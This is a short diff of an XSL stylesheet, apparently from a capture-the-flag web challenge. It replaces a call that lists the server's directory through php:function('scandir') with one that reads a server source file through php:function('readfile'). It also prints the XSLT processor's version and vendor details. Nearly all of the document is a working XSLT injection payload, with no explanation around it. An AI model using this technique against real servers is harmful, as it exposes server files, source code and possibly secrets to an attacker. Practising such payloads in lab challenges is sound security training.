@@ -13,7 +13,7 @@
     </p>
   </div>
 </xsl:for-each>
-<xsl:value-of select="php:function('scandir','./')" />
+<xsl:value-of select="php:function('readfile','/challenge/web-serveur/ch50/index.php')" />
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
